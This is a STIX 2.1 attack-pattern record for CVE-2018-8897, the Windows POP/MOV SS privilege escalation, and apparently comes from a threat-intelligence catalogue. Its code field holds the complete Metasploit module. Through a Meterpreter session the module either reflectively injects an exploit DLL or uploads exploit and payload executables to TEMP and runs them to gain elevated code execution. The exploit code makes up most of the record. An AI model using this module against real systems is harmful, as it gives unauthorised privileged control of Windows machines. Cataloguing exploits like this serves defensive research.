{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--45236988-8e82-461c-b44e-862a78eae42b",
    "created": "2024-08-14T16:49:40.091429Z",
    "modified": "2024-08-14T16:49:40.091433Z",
    "name": "Microsoft Windows POP/MOV SS Local Privilege Elevation Vulnerability",
    "description": " This module exploits a vulnerability in a statement in the system programming guide of the Intel 64 and IA-32 architectures software developer's manual being mishandled in various operating system kerneles, resulting in unexpected behavior for #DB excpetions that are deferred by MOV SS or POP SS.  This module will upload the pre-compiled exploit and use it to execute the final payload in order to gain remote code execution.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/mov_ss.rb",
            "external_id": "mov_ss.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-8897"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/can1357/CVE-2018-8897/"
        },
        {
            "source_name": "reference",
            "url": "https://blog.can.ac/2018/05/11/arbitrary-code-execution-at-ring-0-using-cve-2018-8897/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Exploit::EXE\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Windows POP/MOV SS Local Privilege Elevation Vulnerability',\n        'Description' => %q{\n          This module exploits a vulnerability in a statement in the system programming guide\n          of the Intel 64 and IA-32 architectures software developer's manual being mishandled\n          in various operating system kerneles, resulting in unexpected behavior for #DB\n          excpetions that are deferred by MOV SS or POP SS.\n\n          This module will upload the pre-compiled exploit and use it to execute the final\n          payload in order to gain remote code execution.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Nick Peterson', # Original discovery (@nickeverdox)\n          'Nemanja Mulasmajic',   # Original discovery (@0xNemi)\n          'Can B\u00f6l\u00fck <can1357>',  # PoC\n          'bwatters-r7'           # msf module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          ['Windows x64', { 'Arch' => ARCH_X64 }]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2018-05-08',\n        'References' => [\n          ['CVE', '2018-8897'],\n          ['EDB', '44697'],\n          ['BID', '104071'],\n          ['URL', 'https://github.com/can1357/CVE-2018-8897/'],\n          ['URL', 'https://blog.can.ac/2018/05/11/arbitrary-code-execution-at-ring-0-using-cve-2018-8897/']\n        ],\n        'DefaultOptions' => {\n          'DisablePayloadHandler' => false\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptBool.new('USE_INJECTION',\n                  [true, 'Use in-memory dll injection rather than exe file uploads.', true]),\n      OptString.new('EXPLOIT_NAME',\n                    [false, 'The filename to use for the exploit binary if USE_INJECTION=false (%RAND% by default).', nil]),\n      OptString.new('PAYLOAD_NAME',\n                    [false, 'The filename for the payload to be used on the target host if USE_INJECTION=false (%RAND%.exe by default).', nil]),\n      OptString.new('PATH',\n                    [false, 'Path to write binaries if if USE_INJECTION=false(%TEMP% by default).', nil]),\n      OptInt.new('EXECUTE_DELAY',\n                 [false, 'The number of seconds to delay before executing the exploit if USE_INJECTION=false', 3])\n    ])\n  end\n\n  def setup\n    super\n    @exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha(rand(6..13))\n    @payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha(rand(6..13))\n    @exploit_name = \"#{exploit_name}.exe\" unless exploit_name.match(/\\.exe$/i)\n    @payload_name = \"#{payload_name}.exe\" unless payload_name.match(/\\.exe$/i)\n    @temp_path = datastore['PATH'] || session.sys.config.getenv('TEMP')\n    @payload_path = \"#{temp_path}\\\\#{payload_name}\"\n    @exploit_path = \"#{temp_path}\\\\#{exploit_name}\"\n    @payload_exe = generate_payload_exe\n  end\n\n  def validate_active_host\n    print_status(\"Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}\")\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog(e)\n    raise Msf::Exploit::Failed, 'Could not connect to session'\n  end\n\n  def validate_remote_path(path)\n    unless directory?(path)\n      fail_with(Failure::Unreachable, \"#{path} does not exist on the target\")\n    end\n  end\n\n  def validate_target\n    if sysinfo['Architecture'] != ARCH_X64\n      fail_with(Failure::NoTarget, 'Exploit code is 64-bit only')\n    end\n    version = get_version_info\n    if version.build_number.between?(Msf::WindowsVersion::XP_SP0, Msf::WindowsVersion::XP_SP3)\n      fail_with(Failure::Unknown, 'The exploit binary does not support Windows XP')\n    end\n  end\n\n  def ensure_clean_destination(path)\n    if file?(path)\n      print_status(\"#{path} already exists on the target. Deleting...\")\n      begin\n        file_rm(path)\n        print_status(\"Deleted #{path}\")\n      rescue Rex::Post::Meterpreter::RequestError => e\n        elog(e)\n        print_error(\"Unable to delete #{path}\")\n      end\n    end\n  end\n\n  def ensure_clean_exploit_destination\n    ensure_clean_destination(exploit_path)\n  end\n\n  def ensure_clean_payload_destination\n    ensure_clean_destination(payload_path)\n  end\n\n  def upload_exploit\n    local_exploit_path = ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2018-8897', 'cve-2018-8897-exe.exe')\n    upload_file(exploit_path, local_exploit_path)\n    print_status(\"Exploit uploaded on #{sysinfo['Computer']} to #{exploit_path}\")\n  end\n\n  def upload_payload\n    write_file(payload_path, payload_exe)\n    print_status(\"Payload (#{payload_exe.length} bytes) uploaded on #{sysinfo['Computer']} to #{payload_path}\")\n  end\n\n  def execute_exploit\n    sleep(datastore['EXECUTE_DELAY'])\n    print_status(\"Running exploit #{exploit_path} with payload #{payload_path}\")\n    output = cmd_exec('cmd.exe', \"/c #{exploit_path} #{payload_path}\")\n    vprint_status(output)\n  end\n\n  def exploit_dll\n    print_status('Checking target...')\n    validate_active_host\n    validate_target\n    print_status('Target looks good... reflectively injecting exploit DLL and triggering exploit!')\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2018-8897', 'reflective_dll.x64.dll'),\n      encoded_payload\n    )\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog(e)\n    print_error(e.message)\n  end\n\n  def exploit_exe\n    validate_remote_path(temp_path)\n    ensure_clean_exploit_destination\n    ensure_clean_payload_destination\n    upload_exploit\n    upload_payload\n    execute_exploit\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog(e)\n    print_error(e.message)\n    ensure_clean_exploit_destination\n    ensure_clean_payload_destination\n  end\n\n  def exploit\n    validate_active_host\n    validate_target\n    if datastore['USE_INJECTION']\n      exploit_dll\n    else\n      exploit_exe\n    end\n  end\n\n  attr_reader :exploit_name, :payload_name, :payload_exe, :temp_path, :payload_path, :exploit_path\nend\n",
    "x_mitre_disclosure_date": "2018-05-08",
    "x_mitre_platforms": [
        "['win']"
    ]
}